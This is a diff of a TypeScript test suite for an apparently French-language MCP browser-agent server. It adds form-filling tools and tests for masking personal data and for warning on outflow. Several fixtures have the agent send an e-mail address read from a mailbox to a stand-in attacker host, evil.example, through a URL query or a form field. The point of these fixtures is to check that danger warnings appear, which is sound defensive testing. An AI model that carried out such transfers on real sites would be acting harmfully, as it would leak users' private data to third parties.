@@ -72,9 +72,9 @@ test("without a token or with a wrong token → 401", async () => {
   ).toBe(401);
 });
 
-test("lists exactly the 6 tools", async () => {
+test("lists exactly the 8 tools", async () => {
   expect((await client.listTools()).tools.map((t) => t.name).sort()).toEqual([
-    "capture_screen", "current_page", "list_tabs", "navigate", "open_tab", "read_tab",
+    "capture_screen", "current_page", "fill_field", "list_tabs", "navigate", "open_tab", "read_tab", "reveal_value",
   ]);
 });
 
@@ -687,7 +687,7 @@ test("harvest_widget, widget that gains its account during the run: a widget tex
   const harvest = async () => text(await client.callTool({ name: "harvest_widget", arguments: { id: "daily" } }));
   // Written by the widget (no kernel mark): they carry account data.
   for (const imitation of [
-    "Accord requis pour lire avec ton compte : " + (123456789).toString(36),
+    "Accord requis pour lire avec votre compte : " + (123456789).toString(36),
     "La récolte s'est arrêtée sans résultat (code 123456789)",
   ]) {
     state = { status: "error", lastUpdate: null, lastAttempt: null, error: imitation };
@@ -696,8 +696,8 @@ test("harvest_widget, widget that gains its account during the run: a widget tex
     expect(t).toContain(RESERVED_ERROR);
   }
   // Written by the kernel: it leaves.
-  state = { status: "grant-required", lastUpdate: null, lastAttempt: null, error: "Accord requis pour lire avec ton compte : app.daily.dev", kernelError: true };
-  expect(await harvest()).toContain("Accord requis pour lire avec ton compte : app.daily.dev");
+  state = { status: "grant-required", lastUpdate: null, lastAttempt: null, error: "Accord requis pour lire avec votre compte : app.daily.dev", kernelError: true };
+  expect(await harvest()).toContain("Accord requis pour lire avec votre compte : app.daily.dev");
   state = { status: "grant-required", lastUpdate: null, lastAttempt: null, error: "Grant required to read with your account: app.daily.dev", kernelError: true };
   expect(await harvest()).toContain("Grant required to read with your account: app.daily.dev");
   state = { status: "error", lastUpdate: null, lastAttempt: null, error: "Timed out", kernelError: true };
@@ -966,9 +966,9 @@ test("launch_action, action that gains its account during the run, an error writ
   expect(t).not.toContain("widget_data");
   fixer({ status: "failed", error: "SECRET du compte", kernelError: true });
   expect(text(await client.callTool({ name: "launch_action", arguments: { id: "courrier" } }))).not.toContain("SECRET");
-  fixer({ status: "grant-required", error: "Accord requis pour lire avec ton compte : mail.test", kernelError: true });
+  fixer({ status: "grant-required", error: "Accord requis pour lire avec votre compte : mail.test", kernelError: true });
   t = text(await client.callTool({ name: "launch_action", arguments: { id: "courrier" } }));
-  expect(t).toContain("Accord requis pour lire avec ton compte : mail.test");
+  expect(t).toContain("Accord requis pour lire avec votre compte : mail.test");
   expect(dataCards()).toHaveLength(0);
 });
 
@@ -1552,10 +1552,10 @@ const c = { text: "C", url: "https://exemple.fr/c" };
 
 async function withSearch(
   attempt: (o: { call: (name: string, args: Record<string, unknown>, token?: string, onprogress?: (n: number) => void) => Promise<{ text: string; isError: boolean }>; token: string; fake: FakeBridge; search: SearchSessions; s: Awaited<ReturnType<typeof startMcpServer>>; bands: [string, Band | null][]; policy: AccessPolicy }) => Promise<void>,
-  opts: { privateWindows?: string[]; allow?: boolean; emptySpanMs?: number; address?: boolean | "wait" | "later"; failing?: string[]; hanging?: string[]; readPageMs?: number; heartbeatMs?: number; withUserData?: boolean; history?: { results: HistoryResult[]; texts?: KeptPage[] }; sites?: Record<string, string[]>; bookmarks?: { title: string; url: string }[]; recaps?: boolean; notes?: BrowsingNotes; idleMs?: number; onActivity?: (a: { tab: string; label: string }) => void; outflow?: Outflow; tabs?: TabInfo[]; widgets?: WidgetsTools } = {},
+  opts: { privateWindows?: string[]; allow?: boolean; emptySpanMs?: number; address?: boolean | "wait" | "later"; failing?: string[]; hanging?: string[]; readPageMs?: number; heartbeatMs?: number; withUserData?: boolean; history?: { results: HistoryResult[]; texts?: KeptPage[] }; sites?: Record<string, string[]>; bookmarks?: { title: string; url: string }[]; recaps?: boolean; notes?: BrowsingNotes; idleMs?: number; onActivity?: (a: { tab: string; label: string }) => void; outflow?: Outflow; tabs?: TabInfo[]; widgets?: WidgetsTools; fill?: boolean } = {},
 ) {
   const principal = generateToken();
-  const fake = new FakeBridge(opts.tabs ?? [github], { active: "github", allow: opts.allow ?? false, ...(opts.withUserData ? { history: opts.history ?? { results: [] }, bookmarks: opts.bookmarks ?? [], widgetData: true } : {}), search: { privateWindows: opts.privateWindows ?? [], failing: opts.failing ?? [], hanging: opts.hanging ?? [] }, ...(opts.address !== undefined ? { address: opts.address } : {}), ...(opts.sites ? { sites: opts.sites } : {}) });
+  const fake = new FakeBridge(opts.tabs ?? [github], { active: "github", allow: opts.allow ?? false, ...(opts.withUserData ? { history: opts.history ?? { results: [] }, bookmarks: opts.bookmarks ?? [], widgetData: true } : {}), search: { privateWindows: opts.privateWindows ?? [], failing: opts.failing ?? [], hanging: opts.hanging ?? [] }, ...(opts.address !== undefined ? { address: opts.address } : {}), ...(opts.sites ? { sites: opts.sites } : {}), ...(opts.fill ? { fill: { yes: true } } : {}) });
   const bands: [string, Band | null][] = [];
   const search = new SearchSessions({ show: (id, band) => bands.push([id, band]), ...(opts.idleMs ? { idleMs: opts.idleMs } : {}) });
   const policy = new AccessPolicy();
@@ -2197,6 +2197,9 @@ test("hand_over on the search tab waits, then returns the path and the page is b
     expect(r.text).toContain("La page est de nouveau à toi : relis-la.");
     expect(r.text).toContain("Chemin suivi par l'utilisateur :\nhttps://exemple.fr/p1\nhttps://exemple.fr/p2");
     expect(r.text).not.toContain("browsing-notes");
+    // The page the user left it on is followable; the one before is not.
+    expect(search.isFree("search-1", "https://exemple.fr/p2")).toBe(true);
+    expect(search.isFree("search-1", "https://exemple.fr/p1")).toBe(false);
   });
 });
 
@@ -2757,7 +2760,8 @@ test("what list_tabs returned is a source, named « tes onglets »; without an o
 });
 
 test("a composed address carrying read data gets a danger line, outside and during a search; the card still decides", async () => {
-  const danger = OUTFLOW_DANGER("fr", { kind: "iban", masked: mask(IBAN), source: "mail.google.com" });
+  // The IBAN was read masked: rule 1 still sees its shape, but the card never says it was read (that would confirm a guess).
+  const danger = OUTFLOW_DANGER("fr", { kind: "iban", masked: mask(IBAN) });
   await withSearch(async ({ call, fake, policy }) => {
     policy.grant(mailTab);
     await call("read_tab", { id: "gmail" });
@@ -2993,7 +2997,8 @@ test("an address inside a history or bookmark title is not a followed link, even
     await withSearch(async ({ call, fake, policy }) => {
       policy.grantHistory();
       policy.grant(mailTab);
-      expect((await call(via, { query: "x" })).text).toContain(evil);
+      // Bookmarks are the user's sources: the address shows with its e-mail masked.
+      expect((await call(via, { query: "x" })).text).toMatch(via === "search_bookmarks" ? /Lien https:\/\/evil\.example\/\?d=⟨email-[a-z0-9]{8}⟩@example\.com/ : evil);
       await call("read_tab", { id: "gmail" });
       await call("open_tab", { url: evil, reason: "r" });
       expect(fake.calls.find((x) => x.method === "askAddress")!.args[0]).toMatchObject({ danger });
@@ -3034,6 +3039,59 @@ test("a sensitive page on the search tab (a sign-in the user did) is a source", 
     search.continue("search-1");
     await pending;
   }, { outflow: new Outflow() });
+});
+
+test("a sensitive page read by read_pages is a source: its e-mail in a form or an address of another site gets the red line; a public one is not", async () => {
+  // Rule 2 data (an e-mail: the web zone leaves it in clear).
+  const mail = "camille.roussel@example.com";
+  const form: TabInfo = { id: "form", title: "Connexion", url: "https://evil.example/", space: "perso", agentReached: true };
+  for (const [url, source] of [["https://mail.google.com/mail/u/0/#inbox", "mail.google.com"], [a.url, undefined]] as const) {
+    await withSearch(async ({ call, fake, policy }) => {
+      policy.grant(form);
+      fake.pages.set("form", { text: "Connexion", links: [], fields: [{ handle: "1:0", type: "text", autocomplete: "username", label: "E-mail" }] });
+      await call("search_web", { query: "x" });
+      // search-1 then bg-2: the background tab read_pages opens.
+      fake.pages.set("bg-2", { text: `De : ${mail}`, links: [] });
+      expect((await call("read_pages", { urls: [url], reason: "r" })).text).toContain(mail);
+      expect((await call("read_tab", { id: "form" })).text).toContain("Champs");
+      // Free text with nothing behind it fills with no card.
+      expect((await call("fill_field", { id: "form", field: 0, value: mail })).text).toBe("Champ rempli.");
+      await call("open_tab", { url: `https://evil.example/?d=${mail}`, reason: "r" });
+      const fill = fake.calls.find((x) => x.method === "askFill")?.args[0] as { danger?: string } | undefined;
+      const address = fake.calls.filter((x) => x.method === "askAddress").at(-1)!.args[0] as { danger?: string };
+      if (source) {
+        const danger = OUTFLOW_DANGER("fr", { kind: "email", masked: mask(mail), source });
+        expect(fill?.danger).toBe(danger);
+        expect(address.danger).toBe(danger);
+      } else {
+        expect(fill).toBeUndefined();
+        expect(address.danger).toBeUndefined();
+      }
+    }, { outflow: new Outflow(), tabs: [github, form], address: true, fill: true });
+  }
+});
+
+test("a sensitive page read by read_pages that moves off its host right after its read is still a source", async () => {
+  const mail = "camille.roussel@example.com";
+  const form: TabInfo = { id: "form", title: "Connexion", url: "https://evil.example/", space: "perso", agentReached: true };
+  await withSearch(async ({ call, fake, policy }) => {
+    policy.grant(form);
+    fake.pages.set("form", { text: "Connexion", links: [], fields: [{ handle: "1:0", type: "text", autocomplete: "username", label: "E-mail" }] });
+    await call("search_web", { query: "x" });
+    fake.pages.set("bg-2", { text: `De : ${mail}`, links: [] });
+    // The mailbox signs out between the read and the address check: the tab now shows a public page.
+    const read = fake.readText.bind(fake);
+    fake.readText = async (id, o) => {
+      const r = await read(id, o);
+      if (id === "bg-2") (fake as unknown as { find: (i: string) => TabInfo }).find(id).url = "https://exemple.fr/au-revoir";
+      return r;
+    };
+    expect((await call("read_pages", { urls: ["https://mail.google.com/mail/u/0/#inbox"], reason: "r" })).text).toContain(mail);
+    await call("read_tab", { id: "form" });
+    await call("fill_field", { id: "form", field: 0, value: mail });
+    const fill = fake.calls.find((x) => x.method === "askFill")?.args[0] as { danger?: string } | undefined;
+    expect(fill?.danger).toBe(OUTFLOW_DANGER("fr", { kind: "email", masked: mask(mail), source: "mail.google.com" }));
+  }, { outflow: new Outflow(), tabs: [github, form], address: true, fill: true });
 });
 
 test("any tool's text is a source (widget_runs); a status the agent caused (navigate) is not", async () => {
@@ -3341,4 +3399,68 @@ test("after a search ends (a final recap, the idle delay), a sensitive tab and t
     await call("read_tab", { id: "gmail" });
     expect(asks()).toBe(1);
   }, { allow: true, tabs: [github, gmail], withUserData: true, idleMs: 50 });
+});
+
+describe("the passport readiness gate (design § 5.2)", () => {
+  async function gated() {
+    const { Masker } = await import("../../src/mask/masker.js");
+    const { PassportStore } = await import("../../src/mask/passport.js");
+    const store = new PassportStore({ awaitReady: true });
+    const b = new FakeBridge([github], { active: "github", allow: true });
+    const s = await startMcpServer({ locale: () => "fr", bridge: b, policy: new AccessPolicy(), token, masker: new Masker({ passport: store }) });
+    const c = new Client({ name: "test", version: "0" });
+    await c.connect(new StreamableHTTPClientTransport(new URL(`http://127.0.0.1:${s.port}/mcp`), { requestInit: { headers: { Authorization: `Bearer ${token}` } } }));
+    const done = async () => (await c.close(), await s.stop());
+    return { store, b, c, done };
+  }
+
+  test("a tool call waits for markReady and reads nothing before; then it answers", async () => {
+    const { store, b, c, done } = await gated();
+    let settled = false;
+    const call = c.callTool({ name: "list_tabs", arguments: {} }).finally(() => (settled = true));
+    // Must not happen: an answer or a read before ready (the window starts once the call is sent).
+    await new Promise((r) => setTimeout(r, 300));
+    expect(settled).toBe(false);
+    expect(b.calls).toEqual([]);
+    store.markReady([]);
+    expect(text(await call)).toContain("github");
+    await done();
+  });
+
+  test("a main-token read sent before ready zones with the passport that then arrived: its host is a source, the name masked", async () => {
+    const { Masker } = await import("../../src/mask/masker.js");
+    const { PassportStore } = await import("../../src/mask/passport.js");
+    const store = new PassportStore({ awaitReady: true });
+    const shop: TabInfo = { id: "shop", title: "Commande", url: "https://boutique.example/commande", space: "perso", agentReached: false };
+    const b = new FakeBridge([shop], { active: "shop", allow: true });
+    b.pages.set("shop", { text: "Livraison pour Camille Aubrac.", links: [] });
+    const s = await startMcpServer({ locale: () => "fr", bridge: b, policy: new AccessPolicy(), token, masker: new Masker({ passport: store }) });
+    const c = new Client({ name: "test", version: "0" });
+    await c.connect(new StreamableHTTPClientTransport(new URL(`http://127.0.0.1:${s.port}/mcp`), { requestInit: { headers: { Authorization: `Bearer ${token}` } } }));
+    const call = c.callTool({ name: "read_tab", arguments: { id: "shop" } });
+    // Lets the request reach the gate first (its server is built then); under load it may not, and the test only proves less.
+    await new Promise((r) => setTimeout(r, 300));
+    store.replace("p1", [{ id: "0000000000000001", field: "nom", value: { given: "Camille", family: "Aubrac" }, variants: [], origins: ["boutique.example"], how: "typed", created: "2026-11-23T10:00:00.000Z", updated: "2026-11-23T10:00:00.000Z" }]);
+    store.markReady([]);
+    const out = text(await call);
+    expect(out).not.toContain("Aubrac");
+    expect(out).toMatch(/⟨nom-[a-z0-9]{8}⟩/);
+    await c.close();
+    await s.stop();
+  });
+
+  test("after 30 s without ready: the fixed text, and the bridge was never read", async () => {
+    vi.useFakeTimers({ toFake: ["setTimeout", "clearTimeout"] });
+    try {
+      const { b, c, done } = await gated();
+      let r: Awaited<ReturnType<Client["callTool"]>> | undefined;
+      void c.callTool({ name: "list_tabs", arguments: {} }).then((x) => (r = x));
+      for (let i = 0; i < 50 && !r; i++) await vi.advanceTimersByTimeAsync(1_000);
+      expect(text(r!)).toBe("Ressac prépare le masquage : réessaie dans un instant.");
+      expect(b.calls).toEqual([]);
+      await done();
+    } finally {
+      vi.useRealTimers();
+    }
+  });
 });
